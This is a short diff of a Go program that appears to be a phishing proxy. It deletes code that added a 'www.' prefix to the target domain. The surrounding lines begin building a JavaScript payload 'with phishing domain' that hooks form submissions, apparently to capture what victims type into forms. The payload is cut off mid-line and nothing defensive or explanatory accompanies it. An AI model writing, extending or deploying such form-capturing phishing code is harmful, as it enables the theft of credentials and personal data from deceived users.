@@ -5,7 +5,6 @@ import (
 	"flag"
 	"log"
 	"net/http"
-	"strings"
 )
 
 const (
@@ -44,11 +43,6 @@ func createServer(handler http.Handler) *http.Server {
 
 func main() {
 	flag.Parse()
-
-	// 3. Ensure the "www." prefix
-	if !strings.HasPrefix(targetDomain, "www.") {
-		targetDomain = "www." + targetDomain
-	}
 
 	// Initialize JS payload with phishing domain
 	jsPayload = `document.addEventListener('submit', function(e) {
